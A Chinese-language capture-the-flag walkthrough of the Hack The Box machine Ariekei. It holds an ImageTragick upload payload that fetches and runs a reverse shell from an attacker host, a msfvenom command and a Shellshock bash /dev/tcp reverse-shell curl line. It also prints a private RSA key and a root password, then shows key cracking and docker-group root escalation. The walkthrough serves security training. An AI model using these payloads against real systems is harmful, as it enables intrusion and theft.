# Ariekei\_65

![image-20200920092526268](assets/Ariekei_65.assets/image-20200920092526268.png)

![image-20200920092714139](assets/Ariekei_65.assets/image-20200920092714139.png)

从Nmap的结果可以看出一个nginx服务器和两个运行不同版本的OpenSSH服务器，这表示系统上可能正在运行某种容器或虚拟环境。

```bash
PORT  STATE SERVICE VERSION
22/tcp  open ssh  OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|  2048 a7:5b:ae:65:93:ce:fb:dd:f9:6a:7f:de:50:67:f6:ec (RSA)
|_  256 64:2c:a6:5e:96:ca:fb:10:05:82:36:ba:f0:c9:92:ef (ECDSA)

443/tcp  open https?
| ssl-cert: Subject: stateOrProvinceName=Texas/countryName=US
| Subject Alternative Name: **DNS:calvin.ariekei.htb**, **DNS:beehive.ariekei.htb**
| Not valid before: 2017-09-24T01:37:05
|_Not valid after: 2045-02-08T01:37:05
| tls-nextprotoneg:
|_  http/1.1

1022/tcp open ssh  OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|  1024 98:33:f6:b6:4c:18:f5:80:66:85:47:0c:f6:b7:90:7e (DSA)
|  2048 78:40:0d:1c:79:a1:45:d4:28:75:35:36:ed:42:4f:2d (RSA)
|_  256 45:a6:71:96:df:62:b5:54:66:6b:91:7b:74:6a:db:b7 (ECDSA)
```

打一下目录

![image-20200920111632388](assets/Ariekei_65.assets/image-20200920111632388.png)

继续枚举可以在`/cgi-bin`下发现`stats`

`stats`页面会返回一堆信息，我们可以看到bash版本号为4.2.37，容易受到Shellshock攻击。

![image-20200920112418034](assets/Ariekei_65.assets/image-20200920112418034.png)

但是在利用期间发现被防火墙拦截，没有想到办法绕过。

重新查看扫描报告

注意443端口信息中看到两个域名

```bash
10.10.10.65 calvin.ariekei.htb
10.10.10.65 beehive.ariekei.htb
```

将这两个域名加入host

两个域名都用dirbuster分别打

注意是`https://calvin.ariekei.htb:443/`和`https://beehive.ariekei.htb:443/`

打出个上传页面`upload`

![image-20200920092915674](assets/Ariekei_65.assets/image-20200920092915674.png)

![image-20200920093014257](assets/Ariekei_65.assets/image-20200920093014257.png)

![image-20200920093057428](assets/Ariekei_65.assets/image-20200920093057428.png)

根据标题Image Converter进行了搜索。

![image-20200920101956172](assets/Ariekei_65.assets/image-20200920101956172.png)

Exploit: [https://imagetragick.com](https://imagetragick.com/)

ImageTragick exploit \(CVE-2016-3714\)

[https://www.exploit-db.com/exploits/39767](https://www.exploit-db.com/exploits/39767)

首先使用msfvenom制作一个二进制反shell，放入`/var/www/html`，apache2开启

```bash
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f elf -o shell.elf
```

再制做一个上传的漏洞利用文件exploit.mvg

文件内容如下

Exploit.mvg

```bash
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg"|curl 10.10.14.6/shell.elf -o /tmp/shell.elf; chmod +x /tmp/shell.elf; /tmp/shell.elf; echo "rce1)'
pop graphic-context
```

![image-20200920093231179](assets/Ariekei_65.assets/image-20200920093231179.png)

监听443，上传exploit，马上得到shell

![image-20200920093326068](assets/Ariekei_65.assets/image-20200920093326068.png)

快速搜索一下便发现我们正在Docker容器中。使用mount命令我们可以看到docker环境中已挂载文件和目录的列表。

在common目录中可以发现

```bash
[root@calvin]# cd /common
cd /common
[root@calvin common]# ls -la
ls -la
total 20
drwxr-xr-x 5 root root 4096 Sep 23 18:36 .
drwxr-xr-x 36 root root 4096 Nov 13 15:10 ..
drwxrwxr-x 2 root root 4096 Sep 24 00:59 .secrets
drwxr-xr-x 6 root root 4096 Sep 23 18:32 containers
drwxr-xr-x 2 root root 4096 Sep 24 02:27 network

[root@calvin common]# cd containers
cd containers

[root@calvin containers]#
ls -la
total 24
drwxr-xr-x 6 root root 4096 Sep 23 18:32 .
drwxr-xr-x 5 root root 4096 Sep 23 18:36 ..
drwxr-xr-x 2 root input 4096 Nov 13 14:36 bastion-live
drwxr-xr-x 5 root input 4096 Nov 13 14:36 blog-test
drwxr-xr-x 3 root root 4096 Nov 13 14:36 convert-live
drwxr-xr-x 5 root root 4096 Nov 13 14:36 waf-live

[root@calvin common]# cd ../network
cd network

[root@calvin network]# ls -la
ls -la
total 52
drwxr-xr-x 2 root root 4096 Sep 24 2017 .
drwxr-xr-x 5 root root 4096 Sep 23 2017 ..
-rw-r--r-- 1 root root 39774 Sep 24 2017 info.png
-rwxr-xr-x 1 root root  437 Sep 23 2017 make_nets.sh
```

在containers目录内部，这里可以看到4个容器。

我们可以看到Dockerfiles中每个容器的根密码

![image-20200920093505271](assets/Ariekei_65.assets/image-20200920093505271.png)

bastion：可以看到 ip172.23.0.253 -p 是开了两个端口 1022和22

![image-20200920093558104](assets/Ariekei_65.assets/image-20200920093558104.png)

blog：

convert:

![image-20200920093654406](assets/Ariekei_65.assets/image-20200920093654406.png)

waf

![image-20200920093747168](assets/Ariekei_65.assets/image-20200920093747168.png)

在network目录看到网络组成脚本

```bash
[root@calvin network]# cat make_nets.sh

cat make_nets.sh

#!/bin/bash
# Create isolated network for building containers. No internet access
docker network create -d bridge --subnet**=172.24.0.0/24 --gateway=172.24.0.1 --ip-range=172.24.0.0/24 \**
-o com.docker.network.bridge.enable_ip_masquerade=false \
 arieka-test-net

# Crate network for live containers. Internet access

docker network create -d bridge **--subnet=172.23.0.0/24 --gateway=172.23.0.1 --ip-range=172.23.0.0/24** \
arieka-live-net
```

根据这个组网脚本，可以看到作者利用docker组建了两个网络，172.24和172.23

但是在这个容器中我们看不了网络状态

![image-20200920093858982](assets/Ariekei_65.assets/image-20200920093858982.png)

首先我们还是要确定一下我们到底在哪个容器中

查看 `/proc/net/fib_trie` 可以看到当前容器在172.23.0.0里，同时可以看到ip是172.23.0.11，确定是在容器`convert`中

cat /proc/net/fib\_trie

![image-20200920094004639](assets/Ariekei_65.assets/image-20200920094004639.png)

在.secrets目录中，我们看到RSA密钥。复制私钥

bastion\_key,应该是bastion容器的ssh。

![image-20200920094114393](assets/Ariekei_65.assets/image-20200920094114393.png)

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA8M2fLV0chunp+lPHeK/6C/36cdgMPldtrvHSYzZ0j/Y5cvkR
SZPGfmijBUyGCfqK48jMYnqjLcmHVTlA7wmpzJwoZj2yFqsOlM3Vfp5wa1kxP+JH
g0kZ/Io7NdLTz4gQww6akH9tV4oslHw9EZAJd4CZOocO8B31hIpUdSln5WzQJWrv
pXzPWDhS22KxZqSp2Yr6pA7bhD35yFQ7q0tgogwvqEvn5z9pxnCDHnPeYoj6SeDI
T723ZW/lAsVehaDbXoU/XImbpA9MSF2pMAMBpT5RUG80KqhIxIeZbb52iRukMz3y
5welIrPJLtDTQ4ra3gZtgWvbCfDaV4eOiIIYYQIDAQABAoIBAQDOIAUojLKVnfeG
K17tJR3SVBakir54QtiFz0Q7XurKLIeiricpJ1Da9fDN4WI/enKXZ1Pk3Ht//ylU
P00hENGDbwx58EfYdZZmtAcTesZabZ/lwmlarSGMdjsW6KAc3qkSfxa5qApNy947
QFn6BaTE4ZTIb8HOsqZuTQbcv5PK4v/x/Pe1JTucb6fYF9iT3A/pnXnLrN9AIFBK
/GB02ay3XDkTPh4HfgROHbkwwverzC78RzjMe8cG831TwWa+924u+Pug53GUOwet
A+nCVJSxHvgHuNA2b2oMfsuyS0i7NfPKumjO5hhfLex+SQKOzRXzRXX48LP8hDB0
G75JF/W9AoGBAPvGa7H0Wen3Yg8n1yehy6W8Iqek0KHR17EE4Tk4sjuDL0jiEkWl
WlzQp5Cg6YBtQoICugPSPjjRpu3GK6hI/sG9SGzGJVkgS4QIGUN1g3cP0AIFK08c
41xJOikN+oNInsb2RJ3zSHCsQgERHgMdfGZVQNYcKQz0lO+8U0lEEe1zAoGBAPTY
EWZlh+OMxGlLo4Um89cuUUutPbEaDuvcd5R85H9Ihag6DS5N3mhEjZE/XS27y7wS
3Q4ilYh8Twk6m4REMHeYwz4n0QZ8NH9n6TVxReDsgrBj2nMPVOQaji2xn4L7WYaJ
KImQ+AR9ykV2IlZ42LoyaIntX7IsRC2O/LbkJm3bAoGAFvFZ1vmBSAS29tKWlJH1
0MB4F/a43EYW9ZaQP3qfIzUtFeMj7xzGQzbwTgmbvYw3R0mgUcDS0rKoF3q7d7ZP
ILBy7RaRSLHcr8ddJfyLYkoallSKQcdMIJi7qAoSDeyMK209i3cj3sCTsy0wIvCI
6XpTUi92vit7du0eWcrOJ2kCgYAjrLvUTKThHeicYv3/b66FwuTrfuGHRYG5EhWG
WDA+74Ux/ste3M+0J5DtAeuEt2E3FRSKc7WP/nTRpm10dy8MrgB8tPZ62GwZyD0t
oUSKQkvEgbgZnblDxy7CL6hLQG5J8QAsEyhgFyf6uPzF1rPVZXTf6+tOna6NaNEf
oNyMkwKBgQCCCVKHRFC7na/8qMwuHEb6uRfsQV81pna5mLi55PV6RHxnoZ2wOdTA
jFhkdTVmzkkP62Yxd+DZ8RN+jOEs+cigpPjlhjeFJ+iN7mCZoA7UW/NeAR1GbjOe
BJBoz1pQBtLPQSGPaw+x7rHwgRMAj/LMLTI46fMFAWXB2AzaHHDNPg==
-----END RSA PRIVATE KEY-----
```

![image-20200920094303115](assets/Ariekei_65.assets/image-20200920094303115.png)

注意 600权限！！！

在端口22和1022上进行尝试。端口1022使我们可以使用用户名root进行访问。

```bash
$ nano id_rsa
$ chmod 600 id_rsa
$ ssh root@10.10.10.65 -p 1022 -i id_rsa
```

![image-20200920094722408](assets/Ariekei_65.assets/image-20200920094722408.png)

新容器bastion。先看看网络状态

![image-20200920094817006](assets/Ariekei_65.assets/image-20200920094817006.png)

确实是两个子网。

![image-20200920094914752](assets/Ariekei_65.assets/image-20200920094914752.png)

也能确定一定是进入到bastion容器了，同时也可以与172.24子网通信了。

现在相当于

我们有`172.23.0.11`的`convert`容器和`bastion`容器`172.23.0.253`了

下一个目标是`172.24.0.2`，也就是`blog`。

现在我与bastion 可连接。那需要bastion 转发到同在172.24.0.0的blog

相当于这条的模型

![image-20200920095032447](assets/Ariekei_65.assets/image-20200920095032447.png)

ssh &lt;跳板服务器B的IP:w.x.y.z&gt; -p  -L &lt;本地 A 需要监听的端口8080&gt;:&lt;目标主机C的 IP a.b.c.d&gt;:&lt;目标端口 80&gt;

```bash
$ ssh 10.10.10.65 -p 1022 -L 8080:172.24.0.2:80
```

附加上我们得到的私钥

```bash
$ ssh -i id_rsa 10.10.10.65 -p 1022 -L 8080:172.24.0.2:80
```

验证一下隧道

![image-20200920095141010](assets/Ariekei_65.assets/image-20200920095141010.png)

![image-20200920095222831](assets/Ariekei_65.assets/image-20200920095222831.png)

在刚才新建隧道产生的shell连接里建立监听

![image-20200920095315906](assets/Ariekei_65.assets/image-20200920095315906.png)

然后在本地利用shellshock。搞一下 解释一下这里。之前有waf，所以直接在网页上做shellshock会被waf拦截，建立隧道后，跨墙了。漏洞可利用

```bash
$  curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/172.24.0.253/1234 0>&1;'" http://localhost:8080/cgi-bin/stats
```

![image-20200920095414187](assets/Ariekei_65.assets/image-20200920095414187.png)

![image-20200920095453512](assets/Ariekei_65.assets/image-20200920095453512.png)

我们之前在 blog-test目录下看到的dockerfile内容，。

我们有blog的root密码了。

```bash
root:Ib3!kTEvYw6*P7s
```

![image-20200920095559242](assets/Ariekei_65.assets/image-20200920095559242.png)

su一下。并不可以，。需要tty

![image-20200920095646147](assets/Ariekei_65.assets/image-20200920095646147.png)

在Dockefile中还可以发现，。安装了python。

使用

python -c 'import pty; pty.spawn\("/bin/bash"\)'

![image-20200920095732271](assets/Ariekei_65.assets/image-20200920095732271.png)

成功，粘贴之前的密码

![image-20200920095845921](assets/Ariekei_65.assets/image-20200920095845921.png)

root

四处看一下，找到新的用户。

![image-20200920100001647](assets/Ariekei_65.assets/image-20200920100001647.png)

得到user

看一下ssh

![image-20200920100059498](assets/Ariekei_65.assets/image-20200920100059498.png)

这种是有加密的私钥。

粘贴解密

```bash
$ updatedb
$ locate ssh2john
$ python /usr/share/john/ssh2john.py host_rsa > host_rsa_hash
$ john host_rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![image-20200920100344877](assets/Ariekei_65.assets/image-20200920100344877.png)

得到密码

账户：spanishdancer

密码：purple1

ssh再试

```bash
$ chmod 600 host_rsa
$ ssh -i host_rsa spanishdancer@10.10.10.65
```

![image-20200920100436647](assets/Ariekei_65.assets/image-20200920100436647.png)

———————————————提权———————————————————————————————

相关：

[https://fosterelli.co/privilege-escalation-via-docker.html](https://fosterelli.co/privilege-escalation-via-docker.html)

请注意，该用户是该docker组的成员。一些容器解决方案，包括docker，将有一个专门的组，以允许非特权用户管理其容器，而不必升级为root用户。这是因为docker需要root特权才能执行许多操作。不幸的是，这也使升级到root变得异常容易。记住这一点很重要，

首先，我们查看可用的镜像：

```bash
$ docker images
```

![image-20200920100525988](assets/Ariekei_65.assets/image-20200920100525988.png)

我们将为此使用bash图像。现在，我们以bash作为模板创建一个新映像，

并将主机的根目录挂载在其中的文件夹中/rootfs

```bash
$ docker run -v /:/rootfs -i -t bash
```

![image-20200920100609955](assets/Ariekei_65.assets/image-20200920100609955.png)

